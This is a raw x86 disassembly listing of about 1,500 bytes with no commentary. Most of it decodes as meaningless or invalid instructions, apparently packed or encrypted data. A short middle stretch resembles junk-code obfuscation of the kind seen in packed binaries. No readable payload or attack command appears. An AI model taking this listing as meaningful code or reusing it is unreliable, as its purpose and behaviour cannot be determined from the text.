  405aba:	mov    fs,WORD PTR [edi+ecx*4]
  405abd:	sti    
  405abe:	jo     0x405b00
  405ac0:	mov    bh,0x86
  405ac2:	dec    ecx
  405ac3:	xchg   ecx,eax
  405ac4:	mov    WORD PTR cs:[edx+0x7ef2a32a],ds
  405acb:	mov    bl,0x54
  405acd:	(bad)  
  405ace:	hlt    
  405acf:	shl    eax,0x2d
  405ad2:	mov    ah,bl
  405ad4:	sbb    al,0x29
  405ad6:	dec    esi
  405ad7:	fnstcw WORD PTR [ecx+ebx*2]
  405ada:	xchg   BYTE PTR [ebp+0x66],dh
  405add:	jmp    0xc64fdd25
  405ae2:	stos   DWORD PTR es:[edi],eax
  405ae3:	jecxz  0x405b33
  405ae5:	das    
  405ae6:	int    0x97
  405ae8:	shr    DWORD PTR ds:0xf0407844,1
  405aee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405aef:	scas   eax,DWORD PTR es:[edi]
  405af0:	rol    DWORD PTR [edi+ebx*1],1
  405af3:	mov    eax,ds:0x64b4dba1
  405af8:	ss stos DWORD PTR es:[edi],eax
  405afa:	mov    BYTE PTR [ebp+ecx*2+0x7a503d78],0x93
  405b02:	push   ss
  405b03:	jb     0x405b36
  405b05:	sbb    DWORD PTR [ebx],0x14
  405b08:	dec    edx
  405b09:	repnz pushf 
  405b0b:	adc    edx,DWORD PTR [eax-0x7fb0c56f]
  405b11:	retf   
  405b12:	aas    
  405b13:	sbb    BYTE PTR [ebx+0x305bbfcf],ch
  405b19:	jle    0x405b90
  405b1b:	(bad)  
  405b1c:	xor    BYTE PTR [ecx+eax*1],ch
  405b1f:	addr16 mov ecx,0x8417a6bb
  405b25:	jnp    0x405b15
  405b27:	out    dx,al
  405b28:	out    dx,eax
  405b29:	add    eax,0x76aee409
  405b2e:	daa    
  405b2f:	lock neg BYTE PTR [ebx+0x4cb2c979]
  405b36:	sub    dl,BYTE PTR [edx-0x439fb8ee]
  405b3c:	fidivr WORD PTR [eax-0xa]
  405b3f:	mul    BYTE PTR [ebp-0x612fdb]
  405b45:	aad    0x96
  405b47:	(bad)  
  405b48:	inc    edx
  405b49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b4a:	adc    BYTE PTR [edi],dh
  405b4c:	mov    ecx,ebx
  405b4e:	sahf   
  405b4f:	inc    ecx
  405b50:	add    DWORD PTR [eax+0x466dc143],eax
  405b56:	xlat   BYTE PTR ds:[ebx]
  405b57:	jmp    0x405b51
  405b59:	push   ds
  405b5a:	mov    esi,0x7ff14f68
  405b5f:	add    eax,0xa985d8ee
  405b64:	jmp    0x405b63
  405b66:	cmc    
  405b67:	(bad)  
  405b68:	(bad)  
  405b69:	xor    BYTE PTR [eax+0x48],bh
  405b6c:	pop    edx
  405b6d:	sub    eax,0xc13cbcf
  405b72:	std    
  405b73:	cmp    cl,BYTE PTR [ebx*2-0xa834d99]
  405b7a:	push   ebp
  405b7b:	dec    ecx
  405b7c:	add    al,0xd7
  405b7e:	xchg   esp,eax
  405b7f:	in     al,0xcf
  405b81:	fsub   st,st(5)
  405b83:	cmp    ebx,DWORD PTR [ecx]
  405b85:	push   0xc9e64857
  405b8a:	pop    esi
  405b8b:	stos   DWORD PTR es:[edi],eax
  405b8c:	cdq    
  405b8d:	dec    esp
  405b8e:	neg    DWORD PTR [ecx-0x6e4c2449]
  405b94:	xchg   esi,eax
  405b95:	jle    0x405c10
  405b97:	daa    
  405b98:	call   FWORD PTR [esi]
  405b9a:	out    0x11,eax
  405b9c:	retf   0x47e8
  405b9f:	xor    eax,0x11a9115b
  405ba4:	or     dh,BYTE PTR ds:0x43daaa1
  405baa:	or     eax,0x80cff1c7
  405baf:	je     0x405c0b
  405bb1:	pop    ebx
  405bb2:	pop    fs
  405bb4:	and    BYTE PTR [ebp+0x7b],0x73
  405bb8:	neg    BYTE PTR [edx+0x28bab94c]
  405bbe:	pop    esi
  405bbf:	and    DWORD PTR fs:[eax-0x42],ecx
  405bc3:	push   ebx
  405bc4:	mov    esi,0x7a60d436
  405bc9:	push   edx
  405bca:	sbb    eax,0xa6ebd3ad
  405bcf:	sub    eax,DWORD PTR [ebp-0xf]
  405bd2:	xlat   BYTE PTR ds:[ebx]
  405bd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bd4:	call   0x39f:0x383311b0
  405bdb:	paddusw mm2,QWORD PTR [eax-0x3b81d9f8]
  405be2:	nop
  405be3:	mov    ch,0x2f
  405be5:	pop    edx
  405be6:	cmc    
  405be7:	inc    ebp
  405be8:	xchg   ecx,eax
  405be9:	cmc    
  405bea:	(bad)
  405bed:	dec    edi
  405bee:	(bad)  
  405bef:	xor    esp,ecx
  405bf1:	retf   0x9fbc
  405bf4:	jecxz  0x405c4b
  405bf6:	xor    ebx,DWORD PTR [esp+eax*8]
  405bf9:	push   ds
  405bfa:	push   cs
  405bfb:	popa   
  405bfc:	push   esi
  405bfd:	jns    0x405bbd
  405bff:	inc    esi
  405c00:	aas    
  405c01:	xchg   DWORD PTR [edi-0x3d5eb60d],ebx
  405c07:	xchg   edi,ebx
  405c09:	call   0x1ffe:0x9ad5a214
  405c10:	inc    ebx
  405c11:	enter  0x353d,0x3
  405c15:	push   ebx
  405c16:	hlt    
  405c17:	clc    
  405c18:	cli    
  405c19:	fild   QWORD PTR [edi+eiz*1-0x69]
  405c1d:	sub    BYTE PTR [eax-0x1f],al
  405c20:	push   ds
  405c21:	pop    eax
  405c22:	les    ebx,FWORD PTR [edx-0x3c819271]
  405c28:	out    dx,eax
  405c29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c2a:	xor    DWORD PTR [ebx-0xf488b91],edx
  405c30:	jp     0x405c5f
  405c32:	xchg   ebp,eax
  405c33:	sbb    al,0xa8
  405c35:	or     al,0x60
  405c37:	mov    cl,0x93
  405c39:	or     al,0x8
  405c3b:	inc    DWORD PTR [esi+0x75dd180e]
  405c41:	push   es
  405c42:	(bad)  
  405c43:	not    BYTE PTR [edx]
  405c45:	mov    eax,DWORD PTR [esi]
  405c47:	dec    edx
  405c48:	imul   ebx,DWORD PTR [ebp+0x77],0xffffffb9
  405c4c:	inc    esi
  405c4d:	int    0x3e
  405c4f:	fs or  ch,dh
  405c52:	clc    
  405c53:	loop   0x405c15
  405c55:	frstor [eax+edi*1]
  405c58:	add    esp,esp
  405c5a:	call   0x96aa0b9d
  405c5f:	and    al,0xdc
  405c61:	rcr    DWORD PTR [ecx+0x41e4ffce],0x93
  405c68:	adc    al,0xaa
  405c6a:	fistp  DWORD PTR [edx+0xd]
  405c6d:	(bad)  
  405c6e:	dec    cx
  405c70:	push   ebp
  405c71:	dec    edx
  405c72:	push   0x4cf5e76d
  405c77:	inc    ebp
  405c78:	std    
  405c79:	fdiv   QWORD PTR [ecx]
  405c7b:	les    ecx,FWORD PTR [esi]
  405c7d:	and    DWORD PTR fs:[ebx+0x4e1c379a],ebx
  405c84:	jo     0x405c0d
  405c86:	mov    WORD PTR [ebx],es
  405c88:	sub    BYTE PTR [esi+0x2982152c],0x7f
  405c8f:	test   al,0x9f
  405c91:	leave  
  405c92:	fild   QWORD PTR [edx+0x381563cd]
  405c98:	jp     0x405d0a
  405c9a:	xchg   DWORD PTR [esi+0x154f6b],edx
  405ca0:	aam    0x84
  405ca2:	push   ebp
  405ca3:	cdq    
  405ca4:	xlat   BYTE PTR ds:[ebx]
  405ca5:	cli    
  405ca6:	bound  esp,QWORD PTR ds:0xc58951c3
  405cac:	ficomp DWORD PTR [esp+esi*1-0x40]
  405cb0:	sbb    edx,ecx
  405cb2:	push   cs
  405cb3:	sbb    al,0xfc
  405cb5:	int3   
  405cb6:	push   es
  405cb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cb8:	call   0x7230:0x6c727f4c
  405cbf:	dec    esp
  405cc0:	pop    eax
  405cc1:	cld    
  405cc2:	mov    cl,0x81
  405cc4:	jns    0x405c7d
  405cc6:	cdq    
  405cc7:	stc    
  405cc8:	xchg   DWORD PTR [ebp+eiz*4-0x76],eax
  405ccc:	mov    esp,0x1c967c14
  405cd1:	mov    cl,0x94
  405cd3:	pop    ds
  405cd4:	inc    edi
  405cd5:	icebp  
  405cd6:	mov    ds:0xa32da6f3,eax
  405cdb:	dec    esp
  405cdc:	cwde   
  405cdd:	jnp    0x405d38
  405cdf:	dec    ebp
  405ce0:	mov    bh,0x5c
  405ce2:	adc    ah,ch
  405ce4:	xlat   BYTE PTR ds:[ebx]
  405ce5:	mov    esp,0x533f1d06
  405cea:	das    
  405ceb:	cld    
  405cec:	pusha  
  405ced:	xchg   DWORD PTR [edi-0x68],edi
  405cf0:	push   es
  405cf1:	aad    0x39
  405cf3:	inc    esi
  405cf4:	inc    esi
  405cf5:	fs dec eax
  405cf7:	push   0x631ce029
  405cfc:	fld    TBYTE PTR [ebx+0x7]
  405cff:	cdq    
  405d00:	ja     0x405c91
  405d02:	mov    ch,0x1b
  405d04:	fst    DWORD PTR [ebp-0x5a8f428e]
  405d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d0b:	add    al,0x16
  405d0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d0e:	(bad)  [edi-0x40921560]
  405d14:	xor    DWORD PTR [ebp-0x5cbf4a8e],edx
  405d1a:	jno    0x405cd2
  405d1c:	sub    eax,0xd32a25c8
  405d21:	xor    DWORD PTR [edx-0x60b756da],esp
  405d27:	add    ah,BYTE PTR ds:0x7067b444
  405d2d:	stos   DWORD PTR es:[edi],eax
  405d2e:	and    eax,0x6bf4f081
  405d33:	cmp    BYTE PTR [ebp+0x32780d47],ah
  405d39:	ins    DWORD PTR es:[edi],dx
  405d3a:	jle    0x405d6a
  405d3c:	enter  0xbffb,0x52
  405d40:	test   al,0x5d
  405d42:	ficomp WORD PTR [ebx-0x60]
  405d45:	xchg   edx,eax
  405d46:	xlat   BYTE PTR ds:[ebx]
  405d47:	mov    edx,0xb8bacfe3
  405d4c:	mov    eax,0x37be65ae
  405d51:	adc    eax,0x538bcb7b
  405d56:	add    al,0xf
  405d58:	mov    dh,0x15
  405d5a:	inc    esi
  405d5b:	sub    DWORD PTR [edx+0x0],eax
  405d5e:	sub    DWORD PTR ds:0x4228f2,edx
  405d64:	xor    DWORD PTR [ebp-0x1c],edi
  405d67:	mov    edx,eax
  405d69:	or     DWORD PTR ds:0x4229ae,0x4229a2
  405d73:	xor    eax,eax
  405d75:	or     DWORD PTR ds:0x4228fa,0x422996
  405d7f:	or     eax,DWORD PTR [ebp-0x1c]
  405d82:	shl    edx,0x1e
  405d85:	sub    DWORD PTR ds:0x4228be,0x422982
  405d8f:	imul   eax,ecx
  405d92:	mov    ecx,DWORD PTR [ebx]
  405d94:	mov    edx,DWORD PTR [ebx+0x4]
  405d97:	shrd   ecx,edx,0x2
  405d9b:	inc    DWORD PTR ds:0x4228ee
  405da1:	mov    DWORD PTR [ebp-0x1c],ecx
  405da4:	mov    ecx,DWORD PTR [ebx]
  405da6:	xor    DWORD PTR [ebp-0x1c],edi
  405da9:	shr    edx,0x2
  405dac:	and    edx,DWORD PTR ds:0x4228ba
  405db2:	mov    edx,DWORD PTR [ebx+0x4]
  405db5:	movzx  edx,BYTE PTR ds:0x4228d2
  405dbc:	or     edx,DWORD PTR ds:0x422916
  405dc2:	mov    DWORD PTR ds:0x4228d2,edx
  405dc8:	mov    edx,ecx
  405dca:	add    DWORD PTR ds:0x42292a,0x4228d2
  405dd4:	xor    ecx,ecx
  405dd6:	and    DWORD PTR ds:0x4228c6,0x42295e
  405de0:	or     ecx,DWORD PTR [ebp-0x1c]
  405de3:	sbb    DWORD PTR ds:0x42288e,0x3b2c
  405ded:	shl    edx,0x1e
  405df0:	add    DWORD PTR ds:0x422926,0x2b51
  405dfa:	sub    ecx,eax
  405dfc:	mov    DWORD PTR ds:0x422992,0x2b61
  405e06:	mov    eax,DWORD PTR [ebp-0xc]
  405e09:	cmp    DWORD PTR [eax],ecx
  405e0b:	mov    eax,0x22e3
  405e10:	mov    eax,DWORD PTR [ebp-0xc]
  405e13:	jg     0x4069f3
  405e19:	xor    DWORD PTR ds:0x422956,0x2c62
  405e23:	mov    ecx,DWORD PTR [ebp+0x18]
  405e26:	adc    edx,0x3fdb
  405e2c:	mov    edx,DWORD PTR [ebp+0x1c]
  405e2f:	shrd   ecx,edx,0x2
  405e33:	or     DWORD PTR ds:0x42290e,0x2fd2
  405e3d:	mov    DWORD PTR [ebp-0x1c],ecx
  405e40:	xor    DWORD PTR ds:0x42297e,0x77ef
  405e4a:	mov    ecx,DWORD PTR [ebp+0x18]
  405e4d:	xor    DWORD PTR [ebp-0x1c],edi
  405e50:	shl    ecx,0x1e
  405e53:	xor    ecx,ecx
  405e55:	add    DWORD PTR ds:0x4229c6,0x4228de
  405e5f:	or     ecx,DWORD PTR [ebp-0x1c]
  405e62:	xor    DWORD PTR ds:0x42295a,0x42288a
  405e6c:	shr    edx,0x2
  405e6f:	mov    edx,DWORD PTR [ebp+0x1c]
  405e72:	mov    DWORD PTR [ebp-0x2c],ecx
  405e75:	mov    ecx,DWORD PTR [ebx]
  405e77:	or     DWORD PTR ds:0x42290a,edi
  405e7d:	mov    edx,DWORD PTR [ebx+0x4]
  405e80:	shrd   ecx,edx,0x2
  405e84:	sub    DWORD PTR ds:0x42294a,0x1cb2
  405e8e:	jmp    0x406418
  405e93:	fwait
  405e94:	push   edx
  405e95:	dec    esi
  405e96:	mov    dl,0x4e
  405e98:	xchg   edx,eax
  405e99:	sbb    edx,DWORD PTR [edx+0x58]
  405e9c:	inc    edi
  405e9d:	push   esi
  405e9e:	je     0x405eae
  405ea0:	pop    ss
  405ea1:	shr    BYTE PTR [esi+0x3e],1
  405ea4:	xchg   edi,eax
  405ea5:	push   ss
  405ea6:	push   ss
  405ea7:	cmp    eax,0xf3161604
  405eac:	rol    BYTE PTR [edi+0x2c],cl
  405eaf:	xor    ax,0x81fc
  405eb3:	(bad)  [esi]
  405eb5:	add    DWORD PTR [ebp+esi*1-0x61],ebp
  405eb9:	enter  0x97ba,0x4b
  405ebd:	pop    ss
  405ebe:	jmp    DWORD PTR [edi]
  405ec0:	sbb    ebp,DWORD PTR [eax+0x7feafdcc]
  405ec6:	(bad)  
  405ec7:	mul    DWORD PTR [ebx+0x1e6ed8a9]
  405ecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ece:	pusha  
  405ecf:	popf   
  405ed0:	lock xor cl,ah
  405ed3:	mov    ah,0x1
  405ed5:	push   0x14
  405ed7:	push   eax
  405ed8:	jl     0x405f55
  405eda:	mov    dl,0x7d
  405edc:	jmp    0xd603:0xf8de2704
  405ee3:	cmp    BYTE PTR [ebx+eax*8],0xb0
  405ee7:	pop    eax
  405ee8:	shl    BYTE PTR [eax-0x41f910af],0x9a
  405eef:	xor    ah,bh
  405ef1:	test   DWORD PTR [ebx-0x5268267f],edx
  405ef7:	or     al,0xfe
  405ef9:	aaa    
  405efa:	dec    ebx
  405efb:	xchg   esi,eax
  405efc:	not    DWORD PTR [eax-0x67258425]
  405f02:	cdq    
  405f03:	and    esp,esi
  405f05:	fwait
  405f06:	lds    edx,FWORD PTR [eax-0x72]
  405f09:	xor    eax,0x550dbd2e
  405f0e:	int    0x66
  405f10:	mov    ch,0x2a
  405f12:	aaa    
  405f13:	xor    DWORD PTR [ebx],edi
  405f15:	mov    esp,0xfa010751
  405f1a:	je     0x405f3a
  405f1c:	adc    eax,0xd1118121
  405f21:	iret   
  405f22:	push   ebx
  405f23:	adc    eax,eax
  405f25:	mov    ds:0xdf954c1c,eax
  405f2a:	xchg   ebx,eax
  405f2b:	lea    ecx,[edi]
  405f2d:	mov    edi,0x8aea0ce8
  405f32:	push   esp
  405f33:	and    BYTE PTR [ebx-0x45b3ccef],0x83
  405f3a:	pusha  
  405f3b:	fs sub eax,0x29455275
  405f41:	arpl   WORD PTR [eax],di
  405f43:	mov    ebx,?
  405f45:	jbe    0x405f48
  405f47:	outs   dx,BYTE PTR ds:[esi]
  405f48:	imul   esp,DWORD PTR [eax-0x79],0x592e32be
  405f4f:	pop    esi
  405f50:	daa    
  405f51:	test   bh,ch
  405f53:	push   cs
  405f54:	mov    ch,0xd6
  405f56:	pop    ds
  405f57:	dec    edi
  405f58:	sbb    ebp,ecx
  405f5a:	daa    
  405f5b:	pop    edi
  405f5c:	pop    es
  405f5d:	pusha  
  405f5e:	aam    0x35
  405f60:	xor    al,0x68
  405f62:	call   DWORD PTR [ebp+0x381646e4]
  405f68:	cld    
  405f69:	mov    fs,esi
  405f6b:	cmp    ah,bh
  405f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f6e:	das    
  405f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f70:	jle    0x405f31
  405f72:	sbb    ah,BYTE PTR [edi+ebp*2-0xb]
  405f76:	aam    0x2a
  405f78:	lock test al,0xfc
  405f7b:	pop    esp
  405f7c:	ins    DWORD PTR es:[edi],dx
  405f7d:	sbb    esp,ebx
  405f7f:	mov    WORD PTR ds:0xdc4a0997,ds
  405f85:	mov    ah,0xd
  405f87:	lock (bad) 
  405f89:	sub    cl,BYTE PTR [ecx+0x6be8b78b]
  405f8f:	iret   
  405f90:	call   0x39ed:0x63bb18d7
  405f97:	push   edx
  405f98:	call   0xdb804546
  405f9d:	adc    ebx,DWORD PTR [edx+0x2921a333]
  405fa3:	jmp    0x230ec7b7
  405fa8:	push   cs
  405fa9:	stos   DWORD PTR es:[edi],eax
  405faa:	(bad)  
  405fab:	iret   
  405fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fad:	fisttp DWORD PTR [edi+0x53]
  405fb0:	push   cs
  405fb1:	dec    ecx
  405fb2:	imul   ebp,DWORD PTR [esi],0xe
  405fb5:	push   ebp
  405fb6:	lods   al,BYTE PTR ds:[esi]
  405fb7:	test   al,0x2e
  405fb9:	inc    ebp
  405fba:	lods   al,BYTE PTR ds:[esi]
  405fbb:	sub    BYTE PTR [edi],0x86
  405fbe:	je     0x405fd8
  405fc0:	cs loopne 0x405f52
  405fc3:	cdq    
  405fc4:	shl    BYTE PTR ds:0x37bb2a38,cl
  405fca:	(bad)  
  405fcb:	int3   
  405fcc:	jmp    0xdd7:0x36fb7dc9
  405fd3:	outs   dx,DWORD PTR ds:[esi]
  405fd4:	inc    esp
  405fd5:	xor    BYTE PTR [esi-0x5f],al
  405fd8:	sub    eax,DWORD PTR [eax+0x4e41b3b]
  405fde:	int3   
  405fdf:	cmp    BYTE PTR [edx],ah
  405fe1:	(bad)  
  405fe2:	adc    al,0x2a
  405fe4:	xor    ch,BYTE PTR [ebx+ecx*1]
  405fe7:	mov    ecx,0x12e4ca5a
  405fec:	jmp    0x406039
  405fee:	into   
  405fef:	das    
  405ff0:	rcr    DWORD PTR [ebp+eax*4-0x7906aaaa],0x6e
  405ff8:	jmp    0x978fbc85
  405ffd:	mov    al,0x96
  405fff:	jo     0x406064
  406001:	outs   dx,DWORD PTR ds:[esi]
  406002:	jecxz  0x406068
  406004:	jb     0x405ff9
  406006:	cli    
  406007:	xor    DWORD PTR [ebx+0x78e848a5],esi
  40600d:	jecxz  0x40608e
  40600f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406010:	cmp    DWORD PTR [eax],ecx
  406012:	dec    esi
  406013:	and    esi,esi
  406015:	dec    edx
  406016:	dec    eax
  406017:	scas   eax,DWORD PTR es:[edi]
  406018:	inc    ebx
  406019:	sti    
  40601a:	popa   
  40601b:	dec    ebx
  40601c:	cld    
  40601d:	test   ecx,edi
  40601f:	jmp    0x2e63:0xa51f9323
  406026:	(bad)  
  406027:	fidiv  DWORD PTR [esi+0x17696ca6]
  40602d:	adc    ebp,DWORD PTR [esi]
  40602f:	cdq    
  406030:	and    BYTE PTR [ecx-0x3f674c5f],dl
  406036:	mov    cl,0x3a
  406038:	sti    
  406039:	xor    bl,BYTE PTR [eax]
  40603b:	addr16 daa 
  40603d:	mov    ch,bh
  40603f:	stos   BYTE PTR es:[edi],al
  406040:	call   0xf2cd:0x2266d129
  406047:	dec    esi
  406048:	lahf   
  406049:	jae    0x406016
  40604b:	jle    0x406060
  40604d:	cdq    
  40604e:	jno    0x406084
  406050:	pop    ds
  406051:	push   ds
  406052:	adc    BYTE PTR [esi-0x25],ah
  406055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406056:	(bad)  
  406057:	mov    al,0x65
  406059:	push   ecx
  40605a:	test   eax,0x3af179cc
  40605f:	pop    esp
  406060:	pop    ebp
  406061:	jne    0x4060b6
  406063:	mov    bh,0x3c
  406065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406066:	jle    0x406060
  406068:	repz and eax,0x80ec1482
  40606e:	in     eax,dx
  40606f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406070:	push   ss
  406071:	cwde   
  406072:	push   ebp
  406073:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406074:	sub    al,0x6c
  406076:	mov    BYTE PTR [edx+edx*4+0x4b74e658],dl
  40607d:	nop
  40607e:	xor    ah,dh
  406080:	sub    al,0xf3
  406082:	dec    edx
  406083:	adc    al,0x20
  406085:	mov    ch,0x1d
  406087:	retf   0xbb2e
  40608a:	test   DWORD PTR [edi+0xd3ec787],eax
  406090:	add    esp,DWORD PTR [ebp+0x3b]
  406093:	scas   al,BYTE PTR es:[edi]
  406094:	cdq    
  406095:	cmc    
  406096:	jnp    0x4060fd
  406098:	out    0xa,eax
  40609a:	aas    
  40609b:	pusha  
  40609c:	mov    esi,0xae3fbb94
  4060a1:	xor    esi,edx
  4060a3:	into   
  4060a4:	ins    BYTE PTR es:[edi],dx
  4060a5:	ja     0x406089
  4060a7:	jbe    0x406086
  4060a9:	cmp    DWORD PTR [ebx],ebx
  4060ab:	jno    0x40603c
  4060ad:	mov    esp,0xb2edbc4a
  4060b2:	mov    esp,DWORD PTR [ebp-0x7d32ffe4]
  4060b8:	out    0x96,al
  4060ba:	sub    BYTE PTR [eax],al
  4060bc:	lods   al,BYTE PTR ds:[esi]
  4060bd:	inc    edi
  4060be:	fnstsw WORD PTR fs:[edx-0x63]
  4060c2:	shl    DWORD PTR [ecx+0x22831dd2],cl
  4060c8:	xchg   edx,eax
  4060c9:	in     eax,0xf
  4060cb:	fwait
  4060cc:	sbb    BYTE PTR [esi],ah
  4060ce:	push   esi
  4060cf:	(bad)  
  4060d0:	dec    edx
  4060d1:	sahf   
  4060d2:	mov    al,0xa7
  4060d4:	xchg   esp,eax
  4060d5:	or     eax,0xcbb5772c
  4060da:	mov    ch,0xbf
  4060dc:	cmp    BYTE PTR [esi],0x83
  4060df:	dec    eax
  4060e0:	dec    eax
  4060e1:	repz cs retf 0x7c30
  4060e6:	cmc    
  4060e7:	or     BYTE PTR [ebx-0x20d67d44],dh
  4060ed:	pop    ecx
  4060ee:	push   0x506fd217
  4060f3:	adc    BYTE PTR [eax],dh
  4060f5:	mov    WORD PTR [edi+0x68807a92],ds
  4060fb:	(bad)  
  4060fc:	jle    0x406104
  4060fe:	sar    DWORD PTR [ebp+0x4a91c142],0xc3
  406105:	test   BYTE PTR [edx],al
  406107:	push   ss
  406108:	push   ebx
  406109:	pop    esp
  40610a:	les    edx,FWORD PTR [ebx-0x56]
  40610d:	lock pop esp
  40610f:	lahf   
  406110:	cs inc ecx
  406112:	mov    WORD PTR [eax],gs
  406114:	ret    0x7b4b
  406117:	call   0xa8e32966
  40611c:	aas    
  40611d:	pop    ebx
  40611e:	jns    0x4060fc
  406120:	xchg   ebx,esp
  406122:	sub    al,0x5d
  406124:	adc    DWORD PTR [edx],0x216ebd20
  40612a:	cwde   
  40612b:	fsub   DWORD PTR [eax]
  40612d:	pop    ds
  40612e:	inc    esp
  40612f:	out    dx,al
  406130:	push   es
  406131:	mov    esp,0x956cb353
  406136:	mov    bl,BYTE PTR [ecx+eiz*8-0x72866544]
  40613d:	cs fld st(0)
  406140:	fnsave [esi]
  406142:	add    eax,0x543c66d6
  406147:	push   ds
  406148:	mov    ds:0xb5344c3e,eax
  40614d:	mov    bh,0x73
  40614f:	mov    esi,0x31e4bdfd
  406154:	scas   al,BYTE PTR es:[edi]
  406155:	test   DWORD PTR [esi+edx*8-0xe927581],esi
  40615c:	jl     0x406158
  40615e:	ds add ebp,edx
  406161:	mov    dl,0x84
  406163:	pop    eax
  406164:	xchg   edx,eax
  406165:	or     ah,BYTE PTR [ebp-0x2fa5526e]
  40616b:	xor    BYTE PTR [ebp+0x1d],bl
  40616e:	push   ebx
  40616f:	shr    DWORD PTR [esi-0x5a657db5],cl
  406175:	popf   
  406176:	adc    BYTE PTR [eax+0x3867f84f],ah
  40617c:	jo     0x4061b1
  40617e:	push   eax
  40617f:	or     eax,0x180dc18c
  406184:	or     DWORD PTR [ebp-0x23ec6369],esp
  40618a:	ret    0x596
  40618d:	es mov cl,0xfb
  406190:	pop    ebx
  406191:	pop    ss
  406192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406193:	mov    ebx,0xb37c558f
  406198:	cli    
  406199:	paddsw mm3,QWORD PTR [esi]
  40619c:	add    BYTE PTR [edi+0x5b],cl
  40619f:	imul   edx,DWORD PTR [ebx-0x27],0x7f
  4061a3:	mov    ecx,ebp
  4061a5:	test   BYTE PTR [ebx-0x3ebb8b21],bh
  4061ab:	lahf   
  4061ac:	xchg   esi,eax
  4061ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061ae:	ins    DWORD PTR es:[edi],dx
  4061af:	jmp    0x2a6df1
  4061b4:	push   ss
  4061b5:	stc    
  4061b6:	mov    cl,0xe4
  4061b8:	or     eax,0xab580f99
  4061bd:	mov    esi,0x5f9bc7d3
  4061c2:	xchg   esi,eax
  4061c3:	in     al,dx
  4061c4:	mov    eax,0xfc04b94a
  4061c9:	cmp    al,0xdb
  4061cb:	mov    ebp,0x86bec50
  4061d0:	mov    eax,0xe60c3ece
  4061d5:	pop    ds
  4061d6:	lods   al,BYTE PTR ds:[esi]
  4061d7:	jbe    0x40618a
  4061d9:	xchg   ecx,eax
  4061da:	jl     0x406226
  4061dc:	dec    DWORD PTR [edi-0x2a3f758a]
  4061e2:	push   edx
  4061e3:	adc    BYTE PTR [edx],ah
  4061e5:	xchg   esp,eax
  4061e6:	repnz adc eax,0x4c388a23
  4061ec:	in     al,0x88
  4061ee:	xor    BYTE PTR [ecx-0x7e],dl
  4061f1:	inc    edi
  4061f2:	sbb    bl,BYTE PTR [edi+edi*4+0x25933898]
  4061f9:	cmp    esi,DWORD PTR [ebp+0x452dcc0c]
  4061ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406200:	sub    DWORD PTR [esi*1+0x660ca0f8],0x4663a3a7
  40620b:	(bad)  
  40620c:	popa   
  40620d:	addr16 dec esp
  40620f:	(bad)  
  406210:	sub    dl,bl
  406212:	pop    ebp
  406213:	in     al,0x7c
  406215:	pop    edx
  406216:	(bad)  
  406217:	addr16 dec ebx
  406219:	sbb    BYTE PTR [ebx-0x4f],0x5f
  40621d:	dec    edx
  40621e:	stc    
  40621f:	pop    ebx
  406220:	leave  
  406221:	cmp    eax,0xf5244598
  406226:	lock mov eax,DWORD PTR [edx+esi*2]
  40622a:	cmp    DWORD PTR [edx+0x56f6ac88],esi
  406230:	(bad)  
  406231:	cli    
  406232:	inc    edi
  406233:	xchg   DWORD PTR [edx+0x6387894],esi
  406239:	xchg   esp,eax
  40623a:	sbb    ah,BYTE PTR [edi-0x78]
  40623d:	mov    ds:0xafed2d57,al
  406242:	cmp    dl,bl
  406244:	fidivr WORD PTR [ebp+0x24]
  406247:	xor    al,0xe
  406249:	(bad)  
  40624a:	cmp    DWORD PTR [edi],ecx
  40624c:	jp     0x4062c2
  40624e:	mov    DWORD PTR [ecx+ebx*4-0xd],edx
  406252:	daa    
  406253:	inc    esi
  406254:	ror    BYTE PTR [ebp+0x79042eea],0xa6
  40625b:	scas   eax,DWORD PTR es:[edi]
  40625c:	ss jb  0x40628d
  40625f:	jno    0x40624b
  406261:	sbb    dh,dh
  406263:	popa   
  406264:	adc    BYTE PTR [esi+0x3e],bl
  406267:	pop    es
  406268:	jg     0x4061ed
  40626a:	stc    
  40626b:	sub    al,0x9
  40626d:	xchg   ecx,eax
  40626e:	shl    BYTE PTR [edx+0x3e],1
  406271:	imul   ebx,DWORD PTR [eax-0x7f],0x6962802a
  406278:	jne    0x40624c
  40627a:	imul   DWORD PTR [esi-0x42]
  40627d:	or     eax,0x1a19a2d7
  406282:	or     BYTE PTR [esi+0x28],dh
  406285:	xchg   ebx,eax
  406286:	dec    ecx
  406287:	mov    al,ds:0x664d3b27
  40628c:	out    0x68,al
  40628e:	and    ah,BYTE PTR [ebp+0x3e1e189d]
  406294:	sbb    eax,0xd4442b89
  406299:	xlat   BYTE PTR ds:[ebx]
  40629a:	fld    QWORD PTR [esp+edi*4]
  40629d:	or     dh,BYTE PTR ds:0xaccd1226
  4062a3:	push   esi
  4062a4:	sub    BYTE PTR [edi-0x72],bh
  4062a7:	xchg   esp,eax
  4062a8:	dec    eax
  4062a9:	or     eax,0x3d116144
  4062ae:	add    ecx,ebx
  4062b0:	aas    
  4062b1:	ret    0x1801
  4062b4:	jno    0x4062aa
  4062b6:	mov    ds:0xd4145e23,eax
  4062bb:	stos   DWORD PTR es:[edi],eax
  4062bc:	lds    ecx,FWORD PTR [edi]
  4062be:	pop    ebp
  4062bf:	rol    BYTE PTR [esi+0x46042a6f],0xcf
  4062c6:	xchg   ebp,eax
  4062c7:	mov    al,0x8e
